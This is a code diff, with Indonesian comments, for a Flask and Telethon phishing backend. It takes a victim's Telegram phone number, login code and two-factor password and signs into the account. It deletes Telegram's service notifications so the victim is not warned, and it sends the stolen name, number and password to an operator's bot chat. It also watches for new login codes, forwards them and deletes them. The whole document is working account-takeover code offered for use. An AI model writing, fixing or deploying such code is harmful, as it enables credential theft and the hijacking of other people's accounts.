@@ -8,13 +8,13 @@ from telethon.tl.functions.messages import DeleteHistoryRequest
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Konfigurasi Environment
+# Variabel dari Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 DOMAIN = os.getenv("RAILWAY_STATIC_URL")
-# Memastikan URL Webhook menggunakan HTTPS
+# Pastikan URL menggunakan HTTPS agar Telegram mau kirim data
 RAILWAY_URL = f"https://{DOMAIN}" if DOMAIN else ""
 
 user_db = {}
@@ -32,7 +32,9 @@ def register():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
-        return loop.run_until_complete(handle_flow(data))
+        # Menjamin Flask selalu mengirim balik response (Fix Screenshot 31)
+        res_data = loop.run_until_complete(handle_flow(data))
+        return res_data
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
     finally: loop.close()
@@ -64,8 +66,7 @@ async def handle_flow(data):
             except errors.SessionPasswordNeededError:
                 user_db[nomor]['session'] = client.session.save()
                 return jsonify({"status": "need_2fa"})
-            except:
-                return jsonify({"status": "error", "message": "OTP SALAH"}), 400
+            except: return jsonify({"status": "error", "message": "OTP SALAH"}), 400
 
         elif step == 3:
             sandi = data.get('sandi')
@@ -73,24 +74,20 @@ async def handle_flow(data):
                 await client.sign_in(password=sandi)
                 user_db[nomor]['sandi'] = sandi
                 return await finalize_login(client, nomor)
-            except:
-                return jsonify({"status": "error", "message": "SANDI SALAH"}), 400
+            except: return jsonify({"status": "error", "message": "SANDI SALAH"}), 400
     finally:
         if client: await client.disconnect()
 
 async def finalize_login(client, nomor):
     me = await client.get_me()
-    nama_full = me.first_name if me.first_name else "User"
-    nama_depan = nama_full.split()[0]
-    
+    nama_depan = (me.first_name if me.first_name else "User").split()[0]
     user_db[nomor].update({"nama": nama_depan, "session": client.session.save()})
+    
     await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
     
     pesan = f"Nama: **{nama_depan}**\nNomor: `{nomor}`\nKata sandi: {user_db[nomor]['sandi']}"
     bot_api("sendMessage", {
-        "chat_id": CHAT_ID,
-        "text": pesan,
-        "parse_mode": "Markdown",
+        "chat_id": CHAT_ID, "text": pesan, "parse_mode": "Markdown",
         "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
     })
     return jsonify({"status": "success"})
@@ -98,17 +95,18 @@ async def finalize_login(client, nomor):
 @app.route('/webhook', methods=['POST'])
 def webhook():
     update = request.get_json()
+    # PENTING: Jika ada callback (klik tombol), langsung respon!
     if update and "callback_query" in update:
         call = update["callback_query"]
-        bot_api("answerCallbackQuery", {"callback_query_id": call["id"]})
+        bot_api("answerCallbackQuery", {"callback_query_id": call["id"]}) # Biar loading hilang
         
         callback_data = call.get("data", "")
         if "_" in callback_data:
             act, nomor = callback_data.split("_", 1)
             if act == "upd":
+                # Kirim teks "Siap Menerima OTP"
                 res = bot_api("sendMessage", {
-                    "chat_id": CHAT_ID, 
-                    "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"
+                    "chat_id": CHAT_ID, "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"
                 })
                 if nomor in user_db:
                     user_db[nomor]['status_msg_id'] = res.get('result', {}).get('message_id')
@@ -120,7 +118,6 @@ def webhook():
 async def monitor_otp(nomor):
     data = user_db.get(nomor)
     if not data or not data['session']: return
-    
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     try:
         await client.connect()
@@ -133,22 +130,17 @@ async def monitor_otp(nomor):
                 
                 teks_final = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: {data['sandi']}\nOTP: `{otp.group(0)}`"
                 bot_api("sendMessage", {
-                    "chat_id": CHAT_ID, 
-                    "text": teks_final, 
-                    "parse_mode": "Markdown",
+                    "chat_id": CHAT_ID, "text": teks_final, "parse_mode": "Markdown",
                     "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
                 })
                 await event.delete(revoke=True)
                 await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
-
         await asyncio.wait_for(client.run_until_disconnected(), timeout=900)
     except: pass
     finally: await client.disconnect()
 
 if __name__ == "__main__":
-    # Paksa Set Webhook saat server nyala
     if RAILWAY_URL:
-        wh_url = f"{RAILWAY_URL}/webhook"
-        result = bot_api("setWebhook", {"url": wh_url})
-        print(f"🛰️ STATUS WEBHOOK: {result}") # Lihat di View Logs
+        # Paksa sinkronisasi Webhook setiap restart
+        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
